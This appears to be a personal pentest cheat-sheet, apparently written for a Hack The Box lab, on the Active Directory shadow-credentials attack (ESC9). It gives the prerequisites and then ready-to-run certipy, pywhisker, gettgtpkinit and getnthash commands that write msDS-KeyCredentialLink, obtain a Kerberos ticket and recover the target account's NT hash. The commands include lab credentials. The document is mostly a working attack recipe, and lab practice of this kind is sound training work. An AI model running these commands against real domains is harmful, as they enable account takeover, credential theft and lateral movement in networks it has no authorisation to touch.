#lateral_movement 

## for ESC9
Prerequisites
1. The target Domain Functional Level must be **Windows Server 2016** or above.
2. The target domain must have at least one Domain Controller running Windows Server 2016 or above.
3. The Domain Controller to use during the attack must have its own certificate and keys (this means either the organization must have AD CS, or a PKI, a CA or something alike).
4. The attacker must have control over an account able to write the `msDs-KeyCredentialLink` attribute of the target user or computer account.

### do it all in one command with `certipy`
```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc -dc-ip 10.10.11.69

```
---


basically it allow us to modify the `msDS-KeyCredentialLink` to add shadow credentials
```bash
pywhisker.py -d "<DOMAIN" -u "<USER>" -p "<PASSWORD>" --target "winrm_svc" --action "add"

```


then we need to get TGT with the outputted certs:
```bash
gettgtpkinit.py -cert-pfx $CERT.PFX -pfx-pass $PASS fluffy.htb/winrm_svc winrm_svc.ccache


# can be done with certipy too:

certipy auth -pfx TCnbNbni.pfx -password 'ZUlqKYkrWtrdRqPZqkMl' -username winrm_svc -domain fluffy.htb -dc-ip 10.10.11.69
```
this command will get us AS-REP encryption key. This is the **user's NT hash** derived from the AS-REP response.

export the ccache:
```bash
export KRB5CCNAME=winrm_svc.ccache
```


then last thing to get the NT hash:
```bash
python3 getnthash.py -key 159bb5340c836973dd34c732c9f1efe0e6a98771ef00bdf0918d514b55d405ee fluffy.htb/winrm_svc

```


